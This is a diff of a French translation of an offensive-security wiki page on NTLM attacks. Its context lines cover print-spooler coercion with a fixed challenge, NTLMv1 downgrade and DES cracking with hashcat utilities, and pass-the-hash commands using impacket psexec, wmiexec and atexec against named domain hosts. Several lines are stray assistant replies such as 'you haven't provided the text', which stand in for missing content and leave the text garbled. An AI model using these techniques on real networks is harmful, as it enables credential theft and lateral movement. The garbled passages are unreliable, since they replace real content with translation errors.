@@ -15,7 +15,7 @@ Le support des protocoles d'authentification - LM, NTLMv1 et NTLMv2 - est facili
 **Points clés** :
 
 - Les hachages LM sont vulnérables et un hachage LM vide (`AAD3B435B51404EEAAD3B435B51404EE`) signifie son non-usage.
-- Kerberos est la méthode d'authentification par défaut, NTLM n'étant utilisé que dans certaines conditions.
+- Kerberos est la méthode d'authentification par défaut, avec NTLM utilisé uniquement dans certaines conditions.
 - Les paquets d'authentification NTLM sont identifiables par l'en-tête "NTLMSSP".
 - Les protocoles LM, NTLMv1 et NTLMv2 sont supportés par le fichier système `msv1\_0.dll`.
 
@@ -71,17 +71,17 @@ Le **hachage NT (16 octets)** est divisé en **3 parties de 7 octets chacune** (
 - Les 3 parties peuvent être **attaquées séparément** pour trouver le hachage NT
 - **DES est cassable**
 - La 3ème clé est toujours composée de **5 zéros**.
-- Étant donné le **même défi**, la **réponse** sera **la même**. Ainsi, vous pouvez donner comme **défi** à la victime la chaîne "**1122334455667788**" et attaquer la réponse utilisée **avec des tables arc-en-ciel précalculées**.
+- Étant donné le **même défi**, la **réponse** sera **identique**. Ainsi, vous pouvez donner comme **défi** à la victime la chaîne "**1122334455667788**" et attaquer la réponse utilisée **avec des tables arc-en-ciel précalculées**.
 
 ### Attaque NTLMv1
 
 De nos jours, il devient moins courant de trouver des environnements avec une délégation non contrainte configurée, mais cela ne signifie pas que vous ne pouvez pas **abuser d'un service de spooler d'impression** configuré.
 
-Vous pourriez abuser de certains identifiants/sessions que vous avez déjà sur l'AD pour **demander à l'imprimante de s'authentifier** contre un **hôte sous votre contrôle**. Ensuite, en utilisant `metasploit auxiliary/server/capture/smb` ou `responder`, vous pouvez **définir le défi d'authentification à 1122334455667788**, capturer la tentative d'authentification, et si cela a été fait en utilisant **NTLMv1**, vous pourrez **le casser**.\
+Vous pourriez abuser de certains identifiants/sessions que vous avez déjà sur l'AD pour **demander à l'imprimante de s'authentifier** contre un **hôte sous votre contrôle**. Ensuite, en utilisant `metasploit auxiliary/server/capture/smb` ou `responder`, vous pouvez **définir le défi d'authentification à 1122334455667788**, capturer la tentative d'authentification, et si elle a été effectuée en utilisant **NTLMv1**, vous pourrez **la casser**.\
 Si vous utilisez `responder`, vous pourriez essayer de \*\*utiliser le drapeau `--lm` \*\* pour essayer de **rétrograder** l'**authentification**.\
-_&#x4E;otez que pour cette technique, l'authentification doit être effectuée en utilisant NTLMv1 (NTLMv2 n'est pas valide)._
+_Remarque : pour cette technique, l'authentification doit être effectuée en utilisant NTLMv1 (NTLMv2 n'est pas valide)._
 
-Rappelez-vous que l'imprimante utilisera le compte de l'ordinateur pendant l'authentification, et les comptes d'ordinateur utilisent des **mots de passe longs et aléatoires** que vous **ne pourrez probablement pas casser** en utilisant des **dictionnaires** communs. Mais l'authentification **NTLMv1** **utilise DES** ([plus d'infos ici](#ntlmv1-challenge)), donc en utilisant certains services spécialement dédiés à casser DES, vous pourrez le casser (vous pourriez utiliser [https://crack.sh/](https://crack.sh) ou [https://ntlmv1.com/](https://ntlmv1.com) par exemple).
+N'oubliez pas que l'imprimante utilisera le compte de l'ordinateur pendant l'authentification, et les comptes d'ordinateur utilisent des **mots de passe longs et aléatoires** que vous **ne pourrez probablement pas casser** en utilisant des **dictionnaires** communs. Mais l'authentification **NTLMv1** **utilise DES** ([plus d'infos ici](#ntlmv1-challenge)), donc en utilisant certains services spécialement dédiés à casser DES, vous pourrez le casser (vous pourriez utiliser [https://crack.sh/](https://crack.sh) ou [https://ntlmv1.com/](https://ntlmv1.com) par exemple).
 
 ### Attaque NTLMv1 avec hashcat
 
@@ -117,7 +117,7 @@ To crack with hashcat:
 To Crack with crack.sh use the following token
 NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
 ```
-It seems that you haven't provided the contents you want to be translated. Please provide the text, and I'll be happy to assist you with the translation.
+Je suis désolé, mais je ne peux pas créer de fichiers. Cependant, je peux vous aider à traduire le contenu que vous avez mentionné. Veuillez fournir le texte que vous souhaitez traduire.
 ```bash
 727B4E35F947129E:1122334455667788
 A52B9CDEDAE86934:1122334455667788
@@ -135,7 +135,7 @@ DESKEY2: bcba83e6895b9d
 echo b55d6d04e67926>>des.cand
 echo bcba83e6895b9d>>des.cand
 ```
-Nous devons maintenant utiliser les hashcat-utilities pour convertir les clés des des craquées en parties du hachage NTLM :
+Nous devons maintenant utiliser les hashcat-utilities pour convertir les clés des crackées en parties du hachage NTLM :
 ```bash
 ./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
 b4b9b02e6f09a9 # this is part 1
@@ -143,7 +143,7 @@ b4b9b02e6f09a9 # this is part 1
 ./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
 bd760f388b6700 # this is part 2
 ```
-Il semble que vous n'ayez pas fourni le texte à traduire. Veuillez le partager afin que je puisse vous aider avec la traduction.
+It seems that you haven't provided the text you want to be translated. Please share the relevant English text, and I'll be happy to translate it to French for you.
 ```bash
 ./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788
 
@@ -190,7 +190,7 @@ Vous pouvez télécharger [les binaires impacket pour Windows ici](https://githu
 - **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
 - **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
 - **atexec.exe** (Dans ce cas, vous devez spécifier une commande, cmd.exe et powershell.exe ne sont pas valides pour obtenir un shell interactif) `C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
-- Il y a plusieurs autres binaires Impacket...
+- Il existe plusieurs autres binaires Impacket...
 
 ### Invoke-TheHash
 
